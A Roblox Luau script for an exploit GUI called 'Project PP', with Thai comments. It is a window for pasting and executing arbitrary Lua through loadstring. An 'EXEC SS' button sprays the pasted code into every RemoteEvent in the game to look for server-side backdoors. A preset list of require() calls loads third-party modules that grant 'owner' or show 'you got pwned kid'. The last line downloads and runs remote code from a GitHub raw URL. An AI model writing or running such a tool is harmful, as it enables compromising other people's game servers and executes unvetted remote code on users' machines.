local player = game.Players.LocalPlayer
local pName = player.Name
local UIS = game:GetService("UserInputService")

local scr = Instance.new("ScreenGui")
scr.Name = "ProjectPP_DarkMode_Fixed"
scr.ResetOnSpawn = false
scr.Parent = player:WaitForChild("PlayerGui")

-- [ Main Frame - 600x350 ] --
local main = Instance.new("Frame", scr)
main.Size = UDim2.new(0, 600, 0, 350)
main.Position = UDim2.new(0.5, -300, 0.5, -175)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
main.BorderSizePixel = 1.85
main.BorderColor3 = Color3.fromRGB(60, 60, 60)
main.Active = true -- สำคัญมากเพื่อให้ลากได้
main.Draggable = true -- เปิดระบบลากพื้นฐานของ Roblox เพื่อความชัวร์

-- [ Title & Owner ] --
local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(0, 400, 0, 40)
title.Position = UDim2.new(0, 15, 0, 5)
title.Text = "Project PP {Dark Mode}"
title.TextSize = 26
title.Font = Enum.Font.SourceSansBold
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local desc = Instance.new("TextLabel", main)
desc.Size = UDim2.new(0, 400, 0, 20)
desc.Position = UDim2.new(0, 15, 0, 35)
desc.Text = "private gui by pun_punPP102030"
desc.Font = Enum.Font.SourceSansItalic
desc.TextSize = 14
desc.TextColor3 = Color3.fromRGB(150, 150, 150)
desc.BackgroundTransparency = 1
desc.TextXAlignment = Enum.TextXAlignment.Left

-- [ 1. ระบบลาก (Drag System) แบบลื่นไหล ] --
local dragging, dragInput, dragStart, startPos
local function update(input)
    local delta = input.Position - dragStart
    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

main.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input == dragInput then update(input) end
end)

-- [ Input Box Zone (คำไม่ออกนอกกรอบ) ] --
local inputFrame = Instance.new("Frame", main)
inputFrame.Size = UDim2.new(0, 420, 0, 220)
inputFrame.Position = UDim2.new(0, 10, 0, 60)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 1.85
inputFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)

local input = Instance.new("TextBox", inputFrame)
input.Size = UDim2.new(1, -10, 1, -10)
input.Position = UDim2.new(0, 5, 0, 5)
input.BackgroundTransparency = 1
input.Text = ""
input.TextSize = 16
input.MultiLine = true
input.ClearTextOnFocus = false
input.TextWrapped = true
input.Font = Enum.Font.Code
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.TextXAlignment = Enum.TextXAlignment.Left
input.TextYAlignment = Enum.TextYAlignment.Top
input.PlaceholderText = "Paste Lua or SS Require here..."

-- [ 2. กรอบ Require List (ด้านขวา) ] --
local scriptTitle = Instance.new("TextLabel", main)
scriptTitle.Size = UDim2.new(0, 150, 0, 35)
scriptTitle.Position = UDim2.new(0, 440, 0, 15)
scriptTitle.Text = "Require List"
scriptTitle.TextSize = 20
scriptTitle.Font = Enum.Font.SourceSansBold
scriptTitle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
scriptTitle.BorderSizePixel = 1.85
scriptTitle.BorderColor3 = Color3.fromRGB(60, 60, 60)
scriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)

local scriptFrame = Instance.new("ScrollingFrame", main)
scriptFrame.Size = UDim2.new(0, 150, 0, 280)
scriptFrame.Position = UDim2.new(0, 440, 0, 55)
scriptFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
scriptFrame.BorderSizePixel = 1.85
scriptFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
scriptFrame.CanvasSize = UDim2.new(0, 0, 0, 1200)
scriptFrame.ScrollBarThickness = 5

-- [ รายการสคริปต์ ] --
local scripts = {
    {Title="OWNERS SS", Code='require(92684888032460)({Owners = {"'..pName..'"}})'},
    {Title="ALERT PWN", Code='require(10557341183).alert("'..pName..'", "you got pwned kid")'},
    {Title="SPACE LIB", Code='require(5702244094).space("'..pName..'")'},
    {Title="EAGLE CORE", Code='require(6032524768).Eagle("'..pName..'")'},
    {Title="SF V3 PC", Code='require(132592022786319).SFV3PC("'..pName..'")'}
}

for i, s in ipairs(scripts) do
    local b = Instance.new("TextButton", scriptFrame)
    b.Size = UDim2.new(1, -10, 0, 35)
    b.Position = UDim2.new(0, 5, 0, (i-1)*40 + 5)
    b.Text = s.Title
    b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    b.TextColor3 = Color3.fromRGB(255, 255, 255)
    b.Font = Enum.Font.SourceSansBold
    b.TextSize = 14
    b.BorderSizePixel = 0
    b.MouseButton1Click:Connect(function()
        input.Text = s.Code
        input:CaptureFocus()
    end)
end

-- [ 3. Buttons Zone (ปรับสีปุ่ม CLR เป็นสีแดง) ] --
local function createBtn(x, text, color)
    local frame = Instance.new("Frame", main)
    frame.Size = UDim2.new(0, 100, 0, 50)
    frame.Position = UDim2.new(0, x + 10, 0, 290)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 1.85
    frame.BorderColor3 = Color3.fromRGB(60, 60, 60)

    local btn = Instance.new("TextButton", frame)
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = text
    btn.TextColor3 = color
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = 16
    return btn
end

local execLua = createBtn(0, "EXEC LUA", Color3.fromRGB(0, 255, 150))
local execSS  = createBtn(105, "EXEC SS", Color3.fromRGB(0, 150, 255))
local clrBtn  = createBtn(210, "CLR", Color3.fromRGB(255, 0, 0)) -- เปลี่ยนเป็นสีแดงตามสั่ง
local conBtn  = createBtn(315, "CONSOLE", Color3.fromRGB(255, 150, 0))

-- [ Logic ] --
execLua.MouseButton1Click:Connect(function()
    if input.Text ~= "" then
        local f = loadstring(input.Text)
        if f then pcall(f) end
    end
end)

execSS.MouseButton1Click:Connect(function()
    if input.Text ~= "" then
        local code = input.Text
        task.spawn(function()
            for _, v in pairs(game:GetDescendants()) do
                if v:IsA("RemoteEvent") then
                    pcall(function() v:FireServer(code) end)
                    task.wait(0.01)
                end
            end
        end)
    end
end)

clrBtn.MouseButton1Click:Connect(function() input.Text = "" end)
conBtn.MouseButton1Click:Connect(function() game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F9, false, game) end)

-- [ Finalize ] --
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/popohoyo1029384756-hub/Project_PP_Classic_LoadingGui/refs/heads/main/PPPCLG.lua"))() end)
